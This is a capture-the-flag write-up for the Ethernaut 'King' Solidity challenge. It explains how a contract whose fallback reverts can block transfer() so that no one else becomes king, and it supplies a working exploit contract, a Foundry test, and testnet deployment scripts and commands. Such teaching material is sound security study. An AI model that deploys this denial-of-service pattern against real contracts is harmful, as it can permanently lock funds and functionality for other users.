## 👾 09. King

<br>


### tl; dr

<br>


* the `King` contract represents **[a simple ponzi](https://www.kingoftheether.com/postmortem.html)** where whoever sends the largest amount of `ether` (larger than the current `prize` value) becomes the new king. in this event, the previous king gets paid the new prize.

<br>

* this contract is vulnerable because it trusts the external input of `msg.value` when running `transfer(msg.value)`. 
    - it assumes that the king is an EOA, which could also be a contract. 
    - our goal is to explore this vulnerability to not let anyone else become the king.

<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/1130416/447517a3-2db9-42d1-8f47-513504d31413">
</p>




<br>

```solidity
contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```


<br>

---

### discussion

<br>

* the `King` contract starts with three state variables that are set in the constructor:

```solidity
  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }
```

<br>

* `king` is initially the person who deployed the contract and sets `prize` (the current value to be bet by someone to become `king`). the only requirement is that the `ether` sent to the contract must be larger than `prize`. 


<br>

* following we have the `receive()` function and a getter for `king`. to become a `king` one needs to either be `owner` or send a value for `prize` larger than its current. since we didn't deploy the contract, the first option is not available:

```solidity
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
```

<br>


* looking at `receive()`, we see that after we send enough `prize`, a `payable` function is triggered to pay `prize` to the previous `king`. 
    - it uses `transfer(address)`, which sends the amount of `wei` to `address`, throwing an error on failure.
    - sending `ether` to EOAs is usually performed via `transfer()` method, but remember that there are a few ways of performing external calls in solidity. 
    - the `send()` function also consumes `2300` gas, but returns a `bool`.
    - finally, the `call()` function and the `CALL` opcode can be directly employed, forwarding all gas and returning a `bool`.

<br>

* in addition, note that this contract has no error handling, so an obvious security issue is **unchecked call return values**.
    - in other words, each time a contract sends `ether` to another, it depends on the other contract’s code to handle the transaction and determine its success. 
    - for instance, the contract might not have a `payable` `fallback()`, or have a malicious `fallback()` or `payable` function.
    - if the new `king` is a contract address instead of a EOA, it could redirect `transfer()` and revert its transaction, skipping the execution of the next lines:

```
king = msg.sender;
prize = msg.value;
```

<br>


----

### solution

<br>

* we write our exploit at `src/09/KingExploit.sol`. note that the `fallback()` is optional for winning the challenge, but we add it here to make very clear the point that no `eth` should be sent (*i.e.*, there won't be a new king):

<br>

```solidity
contract KingExploit {

    constructor(address instance) payable {
        (bool success,) = address(instance).call{value: msg.value}("");
        require(success);
    }

    fallback() external payable {
        revert();
    }
}
```


<br>

* we test this script with `test/09/King.t.sol`:

<br>

```solidity
contract KingTest is Test {

    King public king;
    KingExploit public exploit;
    uint256 public prize;
    address payable instance = payable(vm.addr(0x10053)); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {
        vm.prank(instance);  
        vm.deal(instance, 0.1 ether); 
        king = new King{value: 0.1 ether}();
        prize = king.prize();
    }

    function testKingtHack() public {

        vm.startPrank(hacker);

        assertEq(king.owner(), instance);
        assertEq(king._king(), instance);
        assertEq(king.prize(), prize);

        vm.deal(hacker, prize + 1); 
        exploit = new KingExploit{value: prize + 1}(address(king));

        assertEq(king._king(), address(exploit));
        assertEq(king.prize(), prize + 1);

        vm.stopPrank();
        
    }
}
```

<br>

* running with:

<br>

```shell
> forge test --match-contract KingTest -vvvv    
```



<br>

* then, we craft the submission script at `script/09/King.s.sol`:

<br>

```solidity
contract Exploit is Script {

    King public king;
    KingExploit public exploit;    
    address payable instance = payable(vm.envAddress("INSTANCE_LEVEL9"));  
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));    
    uint256 immutable initialDeposit = 0.001 ether; 
          
    function run() external {
        vm.startBroadcast(hacker);
        king = King(instance);
        exploit = new KingExploit{value: king.prize() + initialDeposit}(address(king));
        vm.stopBroadcast();
    }
}
```

<br>

* and finish the problem running:

<br>

```shell
> forge script ./script/09/King.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>


---

### alternative solution using `cast`

<br>

* deploy the exploit with:

<br>

```shell
> forge create src/09/KingExploit.sol:Contract --constructor-args=<level address> --private-key=<private-key> --rpc-url=<sepolia url> --value 1000000000000000wei
```

<br>

* then call the contract with:

<br>

```shell
> cast send <deployed address> --value 0.0001ether --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>


----

### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



<br>


